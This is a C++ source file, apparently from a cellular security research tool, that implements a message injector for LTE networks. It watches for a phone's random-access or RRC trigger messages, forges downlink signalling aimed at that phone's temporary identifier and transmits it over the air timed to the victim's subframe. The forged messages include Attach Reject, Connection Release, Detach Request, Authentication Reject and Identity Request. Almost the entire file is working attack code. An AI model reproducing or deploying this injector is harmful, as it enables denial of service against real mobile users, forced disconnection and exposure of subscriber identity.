#include "include/MsgInjectorForNoSni.h"
#include "include/LTESniffer_Core.h"

extern ThreadSafeQueue<TtiTcrnti> global_tcrnti_queue;

inline const char* toString(TriggerMsgType type) {
  switch (type) {
      case TriggerMsgType::UNKNOWN:       return "Unknown";
      case TriggerMsgType::RAR:           return "Random Access Response (RAR)";
      case TriggerMsgType::RRC_CONN_REQ_MODATA:  return "RRC Connection Request MO DATA";
      case TriggerMsgType::RRC_CONN_REQ_MOSIG:  return "RRC Connection Request MO SIGNALLING";
      case TriggerMsgType::RRC_CONN_REQ_MTACC:  return "RRC Connection Request MT ACCESS";
      case TriggerMsgType::RRC_REEST_REQ: return "RRC Connection Reestablishment Request";
      case TriggerMsgType::NAS_ATTACH_REQ:return "Attach Request";
      case TriggerMsgType::NAS_SERVICE_REQ:return "Service Request";
      case TriggerMsgType::NAS_TAU_REQ:   return "Tracking Area Update Request";
      default:                            return "Invalid Message Type";
  }
}
MsgInjectorForNoSni::MsgInjectorForNoSni(const InjectorConfig& cfg_, LTESniffer_Core* owner_)
  : cfg(cfg_), owner(owner_), nof_ports(cfg_.nof_ports), stop_flag(false),
    attack_type(AttackType::ATTACH_REJECT), tti_offset(0), inject_count(1)
{
  msg_gen.reset(new MsgGenerator());
  worker = std::thread(&MsgInjectorForNoSni::workerLoop, this);
}

MsgInjectorForNoSni::~MsgInjectorForNoSni()
{
  stop_flag = true;
  
  if (worker.joinable()) {
    worker.join();
  }
    
}

std::vector<InjectTask> MsgInjectorForNoSni::generateTasks(const MessageGenRequest& req)
{
    std::vector<InjectTask> tasks;

    for (int i = 0; i < inject_count; ++i) {
        uint32_t target = req.msg_tti + tti_offset + i * tti_interval;
        InjectTask t;
        t.rnti = req.tcrnti;
        t.target_tti = target;
        t.send_time = owner->calculate_injection_time(target);   
       uint32_t nsamples = cfg.buffer_size;

        t.signal = new cf_t*[cfg.cell.nof_ports];
        for (uint32_t port = 0; port < cfg.cell.nof_ports; ++port) {
            t.signal[port] = new cf_t[cfg.buffer_size];
        }
        handle_pdu_signalgen_part2(t.rnti, t.target_tti, t.signal, i);        
        t.nsamples = nsamples;
        t.start_of_burst = true;
        t.end_of_burst = true;
        tasks.push_back(t);
    }

    return tasks;
}


void MsgInjectorForNoSni::scheduleAndSendTasks(const std::vector<InjectTask>& tasks, bool blocking)
{
  for (const auto& t : tasks) {
    int ret = -1;
    MY_LOG() << "Scheduling RF send for RNTI 0x" << std::hex << t.rnti << std::dec
             << " target_tti=" << t.target_tti
             << " send_time=(" << t.send_time.full_secs << " " << t.send_time.frac_secs << ")"
             << " nsamples=" << t.nsamples;
    ret = owner->schedule_rf_send((void**)t.signal,
                                    t.nsamples,
                                    t.send_time,
                                    blocking,
                                    t.start_of_burst,
                                    t.end_of_burst);
    if (ret != (int)t.nsamples) {
      std::cerr << "Warning: send returned " << ret << " expected " << t.nsamples << std::endl;
    }       
  }
}
bool isAttackSupportedForTrigger(AttackType attack, TriggerMsgType trigger) {
  switch (trigger) {
      case TriggerMsgType::RRC_CONN_REQ_MOSIG:
          return (attack == RRC_CON_REL ||
            attack == ATTACH_REJECT ||
            attack == IDENTITY_REQUEST ||
            attack == AUTHEN_REQUEST ||
            attack == AUTHEN_REJECT ||
            attack == ATTACH_ACCEPT ||
            attack == SEC_MOD_COMM ||
            attack == AUTH_REQ_REJ ||
            attack == DETACH_REQUEST||
            attack == PDN_REJECT);
      case TriggerMsgType::RRC_CONN_REQ_MODATA:
      case TriggerMsgType::RRC_CONN_REQ_MTACC:
          return (attack == RRC_CON_REL ||
            attack == SERVICE_REJECT ||
            attack == IDENTITY_REQUEST ||
            attack == DETACH_REQUEST);
          
      case TriggerMsgType::RRC_REEST_REQ:
          return (attack == RRC_CON_REL ||
                  attack == RRC_CON_REEST_REJECT);
      case TriggerMsgType::UL_Target_RNTI:
      return (attack == DETACH_REQUEST ||
              attack == PDCCH_ORDER);
      case TriggerMsgType::RAR:
      default:
          return false;
  }
}
void MsgInjectorForNoSni::workerLoop()
{
  generate_signal_part1();
    
  while (true) {
    std::shared_ptr<TtiTcrnti> msg;
    try {
      msg = global_tcrnti_queue.dequeueImmediate();
    } catch (...) {
        MY_LOG() << "Exception while dequeuing TtiTcrnti";
      std::this_thread::sleep_for(std::chrono::milliseconds(5));
      continue;
    }

    {
      std::lock_guard<std::mutex> lk(mtx);
      if (stop_flag) break;
    }

    if (!msg) {
      continue;
    }    

    if (!isAttackSupportedForTrigger(attack_type, msg->msg_type)) {
        MY_LOG() << "Skip injection: attack type " 
                 << static_cast<int>(attack_type) 
                 << " not supported for trigger " 
                 << toString(msg->msg_type);
        continue;
    }
    MY_LOG() << "Dequeued TtiTcrnti: TTI=" << msg->tti << " TCRNTI=0x" << std::hex << msg->tcrnti << std::dec;
    MessageGenRequest greq;
    greq.tcrnti = msg->tcrnti;
    greq.msg_tti = msg->tti;
    auto tasks = generateTasks(greq);
    scheduleAndSendTasks(tasks, true);          

  }    
}

void MsgInjectorForNoSni::setAttackType(AttackType at) { attack_type = at; }
void MsgInjectorForNoSni::setEMMCause(int ec) { emm_cause = ec; }
void MsgInjectorForNoSni::setESMCause(int ec) { esm_cause = ec; }

void MsgInjectorForNoSni::setTtiOffset(int offset) { tti_offset = offset; }
void MsgInjectorForNoSni::setInjectCount(int count) { inject_count = count; }
void MsgInjectorForNoSni::setTtiInterval(int interval) { tti_interval = interval; }

static const uint8_t tbs_idx_to_mcs_idx[27] = {
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9,  // TBS_idx 0~9 → MCS_idx 0~9
    11, 12, 13, 14, 15, 17, 18, 19, 20, 21, // TBS_idx 10~18
    22, 23, 24, 25, 26, 27, 28              // TBS_idx 19~26
};
static int generate_format1a_broadcast(uint32_t tbs_bytes, uint32_t cell_nof_prb, uint32_t rv, uint16_t rnti, srsran_dci_dl_t* dci) {
  /* Calculate I_tbs for this TBS */
  uint32_t l_crb = 0;
  uint32_t rb_start = 0;
  int tbs = tbs_bytes * 8;
  int i;
  int mcs = -1;
  for (i = 0; i < 27; i++) {
      if (srsran_ra_tbs_from_idx(i, 2) >= tbs) {
      dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_2;
      l_crb                    = 2;
      mcs                      = i;
      mcs = tbs_idx_to_mcs_idx[i];
      tbs                      = srsran_ra_tbs_from_idx(i, 2);
      break;
      } else if (srsran_ra_tbs_from_idx(i, 3) >= tbs) {
      dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_3;
      l_crb                    = 3;
      mcs                      = i;
      mcs = tbs_idx_to_mcs_idx[i];
      tbs                      = srsran_ra_tbs_from_idx(i, 3);
      break;
      }
  }
  if (i == 28) {
      ERROR("Can't allocate Format 1A for TBS=%d\n", tbs);
      return -1;
  }
  if (l_crb == 0) {
      ERROR("L_crb is 0\n");
      return -1;
  }

  INFO("ra_tbs=%d/%d, tbs_bytes=%d, tbs=%d, mcs=%d",
          srsran_ra_tbs_from_idx(mcs, 2),
          srsran_ra_tbs_from_idx(mcs, 3),
          tbs_bytes,
          tbs,
          mcs);
  /*printf("ra_tbs=%d/%d, tbs_bytes=%d, tbs=%d, mcs=%d\n",
          srsran_ra_tbs_from_idx(mcs, 2),
          srsran_ra_tbs_from_idx(mcs, 3),
          tbs_bytes,
          tbs,
          mcs);*/

  dci->alloc_type       = SRSRAN_RA_ALLOC_TYPE2;
  dci->type2_alloc.mode = srsran_ra_type2_t::SRSRAN_RA_TYPE2_LOC;
  dci->type2_alloc.riv  = srsran_ra_type2_to_riv(l_crb, rb_start, cell_nof_prb);
  //test yg changed
  //dci->pid              = 0;
  dci->pid              = 7;
  dci->tb[0].mcs_idx    = mcs;
  dci->tb[0].rv         = rv;
  dci->tb[0].ndi        = 1;
  dci->format           = SRSRAN_DCI_FORMAT1A;
  dci->rnti             = rnti;

  return tbs;
}


void MsgInjectorForNoSni::generate_signal_part1() {
    MY_LOG() << "Generating base signals for attack type " << static_cast<int>(attack_type);
  for (uint32_t i = 0; i < cfg.cell.nof_ports; i++) {
    rar_buffer[i] = (cf_t *)srsran_vec_malloc(sizeof(cf_t) * SRSRAN_SF_LEN_MAX);
    if (!rar_buffer[i]) {
    ERROR("Error allocating buffer");
    }
  }
  enb_dl = (srsran_enb_dl_t* )srsran_vec_malloc(sizeof(srsran_enb_dl_t));
  if (!enb_dl) {
    ERROR("Error allocating buffer\n");
  }
  for (int i = 0; i < SRSRAN_MAX_TB; i++) {
    softbuffer_tx[i] = (srsran_softbuffer_tx_t*)calloc(sizeof(srsran_softbuffer_tx_t), 1);
    if (!softbuffer_tx[i]) {
      ERROR("Error allocating softbuffer_tx");
    }
    if (srsran_softbuffer_tx_init(softbuffer_tx[i], SRSRAN_MAX_PRB)) {
      ERROR("Error initiating softbuffer_tx");
    }
    payload[i] = (uint8_t *)srsran_vec_malloc(sizeof(uint8_t) * 2048);
    if (!payload[i]) {
      ERROR("Error allocating data tx");
    }
    memset(payload[i], 0, sizeof(uint8_t) * 2048);
  }
  if (srsran_enb_dl_init(enb_dl, rar_buffer, cfg.cell.nof_prb)) {
    ERROR("Error initiating eNb downlink");
  }
  if (srsran_enb_dl_set_cell(enb_dl, cfg.cell)) {
    ERROR("Error setting eNb DL cell");
  }

    for (uint32_t p = 0; p < cfg.cell.nof_ports && p < SRSRAN_MAX_PORTS; ++p) {
    if (!temp_buffer[p]) {
        temp_buffer[p] = srsran_vec_cf_malloc(cfg.buffer_size * sizeof(cf_t));
        if (!temp_buffer[p]) {
        ERROR("AttackInjector: Error allocating temp_buffer");
        }
        srsran_vec_cf_zero(temp_buffer[p], cfg.buffer_size);
    }
    }
}


void MsgInjectorForNoSni::handle_pdu_signalgen_part2(uint32_t rnti, uint32_t target_tti, cf_t** signal, int inject_index) {
    generate_signal_part2(rnti, target_tti, inject_index);
    for (uint32_t port = 0; port < cfg.cell.nof_ports; ++port) {
        memcpy(signal[port], temp_buffer[port], sizeof(cf_t) * cfg.buffer_size);
    }
}

void MsgInjectorForNoSni::generate_signal_part2(uint32_t rnti, uint32_t tti, int inject_index)
{
  sf_cfg_dl.tti = tti;
  sf_cfg_dl.cfi = cfg.cfi;
  sf_cfg_dl.sf_type = SRSRAN_SF_NORM;
  srsran_dci_location_t dci_locations[SRSRAN_MAX_CANDIDATES];
  uint32_t num_locations;
  num_locations = srsran_pdcch_common_locations(&enb_dl->pdcch, dci_locations, SRSRAN_MAX_CANDIDATES, cfg.cfi);
  srsran_dci_dl_t dci = {0,};
  srsran_dci_cfg_t dci_cfg = {0,};
  dci.location = dci_locations[0];
  MY_LOG() << "Generating MAC PDU for UE 0x" << std::hex << rnti << std::dec  << " at TTI " << tti;
  uint32_t current_payload_len = 0;
  uint8_t* current_payload = payload[0];

  if (attack_type == AttackType::AUTH_REQ_REJ) {
      int half = inject_count / 2;
      if (inject_index < half) {
          msg_gen->gen_authen_request_pdu(current_payload, &current_payload_len);
      } else {
          msg_gen->gen_authen_reject_pdu(current_payload, &current_payload_len);
      }
  } else {
      msg_gen->gen_mac_pdu(attack_type, current_payload, &current_payload_len, emm_cause, esm_cause);
  }

  generate_format1a_broadcast(current_payload_len, cfg.cell.nof_prb, 0, rnti, &dci);
  srsran_enb_dl_put_base(enb_dl, &sf_cfg_dl);

  if (srsran_enb_dl_put_pdcch_dl(enb_dl, &dci_cfg, &dci)) {
    ERROR("Error putting PDCCH sf_idx=%d", sf_cfg_dl.tti);
  }

  srsran_pdsch_cfg_t pdsch_cfg;
  if (owner->my_srsran_ra_dl_dci_to_grant(&cfg.cell, &sf_cfg_dl, cfg.tm, cfg.enable_256qam, &dci, &pdsch_cfg.grant)) {
    ERROR("Computing DL grant sf_idx=%d", sf_cfg_dl.tti);
  }
  //char str[512];
  //srsran_dci_dl_info(&dci, str, 512);
  for (uint32_t i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
    pdsch_cfg.softbuffers.tx[i] = softbuffer_tx[i];
  }

  pdsch_cfg.power_scale  = true;
  pdsch_cfg.p_a          = 0.0f;                      // 0 dB
  pdsch_cfg.p_b          = (cfg.tm > SRSRAN_TM1) ? 1 : 0; // 0 dB
  pdsch_cfg.rnti         = rnti;
  pdsch_cfg.meas_time_en = false;

  if (srsran_enb_dl_put_pdsch(enb_dl, &pdsch_cfg, payload) < 0) {
    ERROR("Error putting PDSCH sf_idx=%d", sf_cfg_dl.tti);
  }
  //srsran_pdsch_tx_info(&pdsch_cfg, str, 512);
  srsran_enb_dl_gen_signal(enb_dl);

  size_t signal_length = SRSRAN_SF_LEN_PRB(cfg.cell.nof_prb);
  memcpy(temp_buffer[0], zero_buff, cfg.zero_padding_len * sizeof(cf_t));
  memcpy(temp_buffer[0] + cfg.zero_padding_len, rar_buffer[0], signal_length * sizeof(cf_t));
  memcpy(temp_buffer[0] + cfg.zero_padding_len + signal_length, zero_buff, cfg.zero_padding_len * sizeof(cf_t));
}
